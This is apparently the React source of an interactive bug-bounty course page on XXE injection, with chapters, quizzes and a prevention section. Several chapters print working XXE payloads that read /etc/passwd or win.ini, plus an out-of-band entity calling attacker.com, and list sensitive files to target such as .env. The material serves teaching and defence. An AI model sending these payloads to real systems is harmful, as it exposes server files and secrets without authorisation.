import React, { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./XXE.css";

const STORAGE_KEY = "VulnXploit_xxe_course_completed";

const chapters = [
  {
    id: "what-is-xxe",
    title: "What is XXE?",
    content: (
      <>
        <h2>What is XXE (XML External Entity)?</h2>
        <p>
          XXE (XML External Entity) is a critical server-side vulnerability that
          occurs when an application processes XML input and the underlying XML
          parser is configured to allow external entities. By abusing this feature,
          an attacker can read sensitive files from the server, perform Server-Side
          Request Forgery (SSRF), scan internal networks, or even cause a Denial of
          Service (DoS) condition.
        </p>
        <p>
          XML is widely used in web applications for data transfer, configuration,
          authentication (SAML), document formats (DOCX, SVG, PDF), and APIs.
          Whenever an application accepts XML and parses it insecurely, the risk
          of XXE appears.
        </p>

        <h3>Understanding XML Entities</h3>
        <p>
          In XML, an <strong>entity</strong> is a way to define a piece of data
          that can be reused. There are different types of entities:
        </p>
        <ul>
          <li><strong>Internal Entities</strong> – Defined inside the XML document itself</li>
          <li><strong>External Entities</strong> – Load data from an external source (file or URL)</li>
          <li><strong>Parameter Entities</strong> – Used inside the DTD (Document Type Definition)</li>
        </ul>

        <h3>How XXE Works (Step by Step)</h3>
        <ol>
          <li>The application accepts XML data from the user (upload, API, form, etc.).</li>
          <li>The XML parser is configured to process DTDs and external entities.</li>
          <li>The attacker crafts a malicious XML payload that defines an external entity.</li>
          <li>When the server parses the XML, it resolves the external entity.</li>
          <li>The attacker receives the content of a local file or the response from an internal service.</li>
        </ol>

        <h3>Why XXE is Dangerous</h3>
        <ul>
          <li>It can read sensitive files such as <code>/etc/passwd</code>, configuration files, and source code</li>
          <li>It can be turned into SSRF and attack internal systems</li>
          <li>It can access cloud metadata services (AWS, GCP, Azure)</li>
          <li>It can cause Denial of Service using billion laughs attack</li>
          <li>It often requires no authentication</li>
        </ul>

        <h3>Simple Example</h3>
        <pre className="payload-box">
{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>`}
        </pre>

        <div className="info-box">
          <h4>Key Takeaway</h4>
          <p>
            XXE is a high-impact vulnerability that abuses insecure XML parsing.
            The main goals of an attacker are reading local files, performing
            SSRF, accessing cloud metadata, and causing denial of service.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main cause of XXE vulnerability?",
      options: [
        "Using HTTPS",
        "XML parser allowing external entities",
        "Strong passwords",
        "Using JSON only"
      ],
      correct: "XML parser allowing external entities",
    },
  },
  {
    id: "xml-fundamentals",
    title: "XML Fundamentals",
    content: (
      <>
        <h2>XML Fundamentals</h2>
        <p>
          XML (Extensible Markup Language) is a text-based data format designed
          to store and transport structured information between different systems.
        </p>
        <p>
          From a security perspective, understanding XML internals is important
          because vulnerabilities like XXE occur due to insecure XML parser configurations.
        </p>

        <h3>What is XML?</h3>
        <pre className="payload-box">
{`<?xml version="1.0"?>
<user>
    <name>Rashid</name>
    <role>Security Researcher</role>
</user>`}
        </pre>

        <h3>How XML Works</h3>
        <ul>
          <li>XML Document</li>
          <li>XML Parser</li>
          <li>Application Logic</li>
        </ul>

        <h3>What is DTD?</h3>
        <p>
          DTD stands for Document Type Definition. It defines the structure and
          allowed elements inside an XML document. External entities are declared
          inside DTD sections.
        </p>

        <h3>External Entities</h3>
        <pre className="payload-box">
{`<!ENTITY example SYSTEM "external-resource">`}
        </pre>

        <div className="info-box">
          <h4>Key Takeaway</h4>
          <p>
            XML itself is not vulnerable. The vulnerability appears when an
            application uses unsafe XML parser configurations that allow external
            entities and DTD processing.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Where are external entities declared in XML?",
      options: [
        "Inside HTML comments",
        "Inside the DTD section",
        "Only in JSON",
        "Only in CSS"
      ],
      correct: "Inside the DTD section",
    },
  },
  {
    id: "classic",
    title: "Classic XXE",
    content: (
      <>
        <h2>Classic (In-band) XXE</h2>
        <p>
          Classic XXE (also known as In-band XXE) is the most straightforward
          form of XML External Entity injection. In this type, the application
          parses the attacker’s XML, resolves the external entity, and returns
          the result directly in the HTTP response.
        </p>

        <h3>Basic Payload – Read Local File (Linux)</h3>
        <pre className="payload-box">
{`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <name>&xxe;</name>
</data>`}
        </pre>

        <h3>Windows Example</h3>
        <pre className="payload-box">
{`<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">`}
        </pre>

        <h3>Useful Files to Read</h3>
        <ul>
          <li><code>/etc/passwd</code></li>
          <li><code>/etc/hostname</code></li>
          <li><code>/proc/self/environ</code></li>
          <li>Application configuration files (.env, web.config)</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Classic XXE is the easiest form. If the application reflects the
            external entity value in the response, you can directly read local files.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "In Classic XXE, where does the attacker see the result?",
      options: [
        "Only in server logs",
        "Directly in the HTTP response",
        "Only via DNS",
        "Only in email"
      ],
      correct: "Directly in the HTTP response",
    },
  },
  {
    id: "xxe-attack-surface",
    title: "XXE Attack Surface",
    content: (
      <>
        <h2>XXE Attack Surface</h2>
        <p>
          XXE vulnerabilities appear wherever an application accepts and processes
          XML data.
        </p>

        <h3>Common XXE Attack Locations</h3>
        <ul>
          <li>XML API Endpoints</li>
          <li>SOAP Web Services</li>
          <li>File Upload Features</li>
          <li>SVG Image Processing</li>
          <li>Document Conversion Systems</li>
          <li>Import / Export Functions</li>
        </ul>

        <h3>XXE Indicators</h3>
        <ul>
          <li>Content-Type: application/xml</li>
          <li>SOAP requests</li>
          <li>.xml file uploads</li>
          <li>SVG processing</li>
          <li>XML import features</li>
        </ul>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            The most common targets are APIs, SOAP services, file uploads,
            SVG processing, and import/export features.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which of the following is a common XXE attack surface?",
      options: [
        "Only CSS files",
        "SVG image processing and SOAP services",
        "Only images without XML",
        "Only JavaScript files"
      ],
      correct: "SVG image processing and SOAP services",
    },
  },
  {
    id: "blind",
    title: "Blind XXE",
    content: (
      <>
        <h2>Blind XXE (Out-of-Band XXE)</h2>
        <p>
          Blind XXE is a more advanced form of XML External Entity injection.
          In this scenario, the application does not return the result of the
          external entity directly in the response.
        </p>
        <p>
          Attackers use out-of-band techniques (OOB) such as DNS or HTTP
          interactions to confirm the vulnerability and extract data.
        </p>

        <h3>How Blind XXE Works</h3>
        <ol>
          <li>Attacker sends a malicious XML with external entity.</li>
          <li>Server resolves the entity and makes an outbound request.</li>
          <li>Attacker monitors their server (DNS/HTTP) for the interaction.</li>
        </ol>

        <h3>Example OOB Payload</h3>
        <pre className="payload-box">
{`<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<data>&xxe;</data>`}
        </pre>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Blind XXE relies on out-of-band channels (DNS/HTTP) because the
            application does not reflect the entity content directly.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "How do attackers usually detect Blind XXE?",
      options: [
        "By seeing file content in response",
        "Through out-of-band interactions (DNS/HTTP)",
        "Only by changing page color",
        "Only using XSS"
      ],
      correct: "Through out-of-band interactions (DNS/HTTP)",
    },
  },
  {
    id: "labs",
    title: "Practice Labs",
    content: (
      <>
        <h2>Practice Labs & Resources</h2>
        <p>
          Learning XXE vulnerabilities requires practical experience.
        </p>

        <h3>Recommended Platforms</h3>
        <ul>
          <li>PortSwigger Web Security Academy – XXE Labs</li>
          <li>OWASP WebGoat</li>
          <li>PentesterLab – XXE Exercises</li>
          <li>HackTheBox & TryHackMe XXE Rooms</li>
        </ul>

        <h3>Recommended Practice Roadmap</h3>
        <ol>
          <li>Understand XML and entity processing</li>
          <li>Practice basic XXE file disclosure labs</li>
          <li>Learn XXE to SSRF techniques</li>
          <li>Practice blind XXE scenarios</li>
          <li>Analyze real bug bounty reports</li>
          <li>Write professional vulnerability reports</li>
        </ol>

        <div className="info-box">
          <h4>Professional Tip</h4>
          <p>
            Always practice XXE exploitation on legal training platforms or
            applications where you have explicit permission.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which platform is highly recommended for XXE labs?",
      options: [
        "Only social media",
        "PortSwigger Web Security Academy",
        "Only YouTube comments",
        "Only random websites"
      ],
      correct: "PortSwigger Web Security Academy",
    },
  },
  {
    id: "prevention",
    title: "XXE Prevention",
    content: (
      <>
        <h2>How to Prevent XXE (XML External Entity)</h2>
        <p>
          The most effective defense is to disable unnecessary XML features and
          follow secure parser configuration practices.
        </p>

        <h3>1. Disable External Entity Processing</h3>
        <ul>
          <li>Disable external general entities</li>
          <li>Disable external parameter entities</li>
          <li>Disable external DTD loading</li>
        </ul>

        <h3>2. Disable DTD Processing</h3>
        <p>
          Since XXE attacks depend on DTD processing, disabling DTD support
          removes the attack surface.
        </p>

        <h3>3. Use JSON Instead of XML When Possible</h3>
        <p>
          JSON does not support external entities, reducing the attack surface.
        </p>

        <h3>4. Keep XML Parsers Updated</h3>
        <p>
          Regularly update XML libraries and remove outdated dependencies.
        </p>

        <div className="info-box">
          <h4>Summary</h4>
          <p>
            The strongest XXE defense is disabling DTD processing and external
            entities completely.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the strongest defense against XXE?",
      options: [
        "Using CAPTCHA",
        "Disabling DTD and external entity processing",
        "Only using GET requests",
        "Disabling JavaScript"
      ],
      correct: "Disabling DTD and external entity processing",
    },
  },
  {
    id: "real-world-xxe-case-studies",
    title: "Real World XXE Case Studies",
    content: (
      <>
        <h2>Real World XXE Case Studies</h2>
        <p>
          Real-world XXE vulnerabilities demonstrate how a small XML parser
          misconfiguration can become a serious security issue.
        </p>

        <h3>Case Study Examples</h3>
        <ul>
          <li>Enterprise Application XML Parser Exposure</li>
          <li>XXE Through File Upload (SVG, XML documents)</li>
          <li>SOAP API XXE</li>
          <li>XXE Leading To SSRF</li>
          <li>Cloud Environment XXE Risk (Metadata services)</li>
        </ul>

        <h3>Lessons Learned</h3>
        <ul>
          <li>XML parsers must be securely configured</li>
          <li>Default settings may be dangerous</li>
          <li>File processing requires security review</li>
          <li>Small configuration mistakes create major risks</li>
        </ul>

        <div className="info-box">
          <h4>Final Takeaway</h4>
          <p>
            XXE is not just an XML vulnerability. It is a security design issue
            involving input handling, parser configuration, and trust boundaries.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What can XXE lead to in cloud environments?",
      options: [
        "Only color change",
        "Access to cloud metadata services",
        "Only slow loading",
        "Only CSS issues"
      ],
      correct: "Access to cloud metadata services",
    },
  },
];

const XXE = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(completedChapters));
  }, [completedChapters]);

  const completedCount = completedChapters.length;
  const totalChapters = chapters.length;
  const progress = Math.round((completedCount / totalChapters) * 100);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;

    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">XXE Injection</span>
          </h1>
          <p className="article-date">Interactive Course • 2026</p>
          <p className="article-date" style={{ marginTop: 8 }}>
            Progress: {completedCount}/{totalChapters} chapters · {progress}%
          </p>
        </div>
      </section>

      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/3JD3CxPEffWdlS4ozIF3/image.png"
          alt="XXE Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x420/1a0b2e/a855f7?text=XXE+Injection";
          }}
        />
      </section>

      <section className="article-body">
        <div className="article-container">
          <aside className="article-sidebar">
            <h3>On this Article</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${activeChapter.id === chapter.id ? "active" : ""} ${
                    completedChapters.includes(chapter.id) ? "completed" : ""
                  }`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>

                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>

                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default XXE;